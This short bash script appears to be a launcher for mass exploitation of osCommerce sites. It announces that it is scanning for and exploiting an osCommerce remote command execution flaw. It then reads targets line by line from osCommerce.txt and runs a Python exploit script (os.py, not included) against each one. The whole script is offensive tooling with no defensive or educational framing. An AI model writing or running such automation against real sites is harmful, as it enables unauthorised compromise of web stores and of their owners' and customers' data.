echo wait scanning vulnerability and try exploiting osCommerce Remote Command execution
        exec<osCommerce.txt
        k=0;
        while read line
        do
        x=$line;
        let "k+=1"
clear; echo $x; python3 os.py $x

done
